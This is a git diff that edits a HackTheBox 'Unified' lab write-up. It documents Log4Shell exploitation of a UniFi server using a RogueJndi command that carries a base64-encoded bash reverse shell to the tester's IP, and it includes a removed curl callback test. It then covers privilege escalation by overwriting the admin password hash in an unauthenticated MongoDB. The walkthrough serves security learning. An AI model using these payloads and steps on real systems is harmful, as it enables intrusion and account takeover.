@@ -7,25 +7,25 @@ competition: 'htb'
 ---
 ## Nmap Recon
 
-![Screenshot 2026-02-05 at 09.20.09.png](/image/writing/competition/HTB-unified/1.png)
+![Screenshot 2026-02-05 at 09.20.09.png](/image/competition/htb-unified/1.png)
 
-There is a UniFi network application version 6.4.54 running on port 8443.
+Based on Nmap scanning, port 22, 6789, 8080, and 8443 are open. Port 8443 serves a UniFi network application version 6.4.54.
 
 ## Testing for Log4Shell Vulnerability
 
-UniFi network application version 6.4.54 is vulnerable to RCE, due to the Log4Shell (CVE-2021-44228). To test it, we try to force the server to make an outbound LDAP request to our machine. We first run tcpdump on port 389 to monitor any incoming request by:
+UniFi network application version 6.4.54 is vulnerable to RCE, due to the Log4Shell (CVE-2021-44228). To test it, we try to force the server to make an outbound LDAP request to our machine. We initiate tcpdump on port 389 to monitor any incoming request by running the following command:
 
 ```php
 tcpdump -i utun4 port 389
 ```
 
-Then, we inject an LDAP request to the `remember` field  of the login POST request.
+Then, we inject a message lookup substitution into the `remember` field  of the login POST request which will cause the Log4J to try to resolve it by initating a JNDI lookup on the specified LDAP server (our machine).
 
-![Screenshot 2026-02-06 at 21.24.17.png](/image/writing/competition/HTB-unified/2.png)
+![Screenshot 2026-02-06 at 21.24.17.png](/image/competition/htb-unified/2.png)
 
-Our machine record the LDAP request made by the server, indicating that the server is vulnerable to Log4Shell.
+Our machine records the LDAP request made by the server, indicating that the server is vulnerable to Log4Shell.
 
-![Screenshot 2026-02-07 at 04.46.01.png](/image/writing/competition/HTB-unified/3.png)
+![Screenshot 2026-02-07 at 04.46.01.png](/image/competition/htb-unified/3.png)
 
 ## Initiating a Reverse Shell
 
@@ -41,20 +41,6 @@ We then start the rogue JNDI server that hosts the encoded malicious code:
 ```bash
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSAxPiYgL2Rldi90Y3AvMTAuMTAuMTUuMjA3LzEzMzcgMD4mMScK}|{base64,-d}|{bash,-i}" --hostname "10.10.15.207"
 
-+-+-+-+-+-+-+-+-+-+
-|R|o|g|u|e|J|n|d|i|
-+-+-+-+-+-+-+-+-+-+
-Starting HTTP server on 0.0.0.0:8000
-Starting LDAP server on 0.0.0.0:1389
-Mapping ldap://10.10.15.207:1389/o=tomcat to artsploit.controllers.Tomcat
-Mapping ldap://10.10.15.207:1389/o=websphere2 to artsploit.controllers.WebSphere2
-Mapping ldap://10.10.15.207:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
-Mapping ldap://10.10.15.207:1389/o=groovy to artsploit.controllers.Groovy
-Mapping ldap://10.10.15.207:1389/ to artsploit.controllers.RemoteReference
-Mapping ldap://10.10.15.207:1389/o=reference to artsploit.controllers.RemoteReference
-Mapping ldap://10.10.15.207:1389/o=websphere1 to artsploit.controllers.WebSphere1
-Mapping ldap://10.10.15.207:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
-Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
 ```
 
 We also setup a netcat listener on port 1337:
@@ -72,28 +58,21 @@ We then force the server to make a JNDI lookup to our rogue LDAP sever by sendin
 "strict":true
 ```
 
-```bash
-echo "curl 10.10.15.207:4444" | base64
-rogue-jndi % java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,Y3VybCAxMC4xMC4xNS4yMDc6NDQ0NAo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.207"
-```
-
-![Screenshot 2026-02-07 at 10.30.35.png](/image/writing/competition/HTB-unified/4.png)
-
-Once the reverse shell is achieved, we upgrade it into a tty by using the following command:
+Once the reverse shell is achieved, we upgrade it into a tty by executing the following command:
 
 ```bash
 script /dev/null -c bash
 ```
 
-![Screenshot 2026-02-07 at 10.32.30.png](/image/writing/competition/HTB-unified/5.png)
+![Screenshot 2026-02-07 at 10.32.30.png](/image/competition/htb-unified/4.png)
 
 The first flag (user.txt) was found at `/home/michael/user.txt` : 6ced1a6a89e666c0620cdb10262ba127
 
-![Screenshot 2026-02-07 at 10.33.47.png](/image/writing/competition/HTB-unified/6.png)
+![Screenshot 2026-02-07 at 10.33.47.png](/image/competition/htb-unified/5.png)
 
 ## Privilege Escalation
 
-Based on this article https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi, the MongoDB instance storing all application information is listening on [localhost](http://localhost) without authentication. Therefore, any user can read, update, or add information to it. We choose to update the hashed password of the administrator with out controlled value. We get the name of the database by connecting to the mongodb and list the database names (the database name is ace):
+Based on this [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi), the MongoDB instance storing all application information is listening on [localhost](http://localhost) without authentication. Therefore, any user can read, update, or add information to it. We choose to update the hashed password of the administrator with our controlled value. We get the name of the database by connecting to the mongodb and list the database names (the database name is ace):
 
 ```bash
 mongosh --host 127.0.0.1 --port 27117
@@ -105,7 +84,7 @@ To  get the hashed password, we execute the following command, which uses the ev
  mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 ```
 
-![Screenshot 2026-02-07 at 11.04.11.png](/image/writing/competition/HTB-unified/7.png)
+![Screenshot 2026-02-07 at 11.04.11.png](/image/competition/htb-unified/6.png)
 
 The identifier is $6$ which means that it is a SHA-512. Therefore, we create a new SHA-512 hashed password to replace it using this command:
 
@@ -122,7 +101,7 @@ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb00
 
 Then, we can login to the UniFi page using the credentials, and enable SSH under settings → Site. The password is `NotACrackablePassword4U2022`
 
-![Screenshot 2026-02-07 at 10.50.14.png](/image/writing/competition/HTB-unified/8.png)
+![Screenshot 2026-02-07 at 10.50.14.png](/image/competition/htb-unified/7.png)
 
 We then initiate an SSH connection using the credential, and retrieve the root flag:
 
@@ -140,11 +119,11 @@ e50bc93c75b634e4b272d2f771c336
 
 ### Lightweight Directory Access Protocol (LDAP)
 
-LDAP is a directory service is a specialized database  to store, organize, and retrieve information about objects in a network in a structured and searchable way. Each entry is an object which has multiple attributes. It is typically used for centralized login management, access control, policy enforcement, and service discovery. LDAP is an application layer protocol to access the directory service over an IP network.
+Directory service is a specialized database  to store, organize, and retrieve information about objects in a network in a structured and searchable way. Each entry is an object which has multiple attributes. It is typically used for centralized login management, access control, policy enforcement, and service discovery. LDAP is an application layer protocol to access the directory service over an IP network.
 
 ### Log4Shell (**CVE-2021-44228**)
 
-Log4Shell is a vulnerability reported in November 2021 in log4j, a java-based logging utility. It takes advantage of Log4j ability to request to LDAP and JNDI servers, allowing attackers to execute Java code on the server. Log4Shell is caused by attacker taking advantage over two Log4J features, which are JNDI and message lookup substitution. 
+Log4Shell is a vulnerability reported in November 2021 in log4j, a java-based logging utility. It is caused by 2 features in Log4J, which is JNDI and message lookup substitution.
 
 Java Naming and Directory Interface (JNDI) is a java API for directory service that allows Java software clients to discover and look up data and resources (in the forms of Java objects) via a name. It is typically used to connect Java application to an external directory service, using protocol like lDAP. JNDI lookup is a command that tells the app to go to a server and download a specific object. The older version of Log4j automatically run any code downloaded.
 
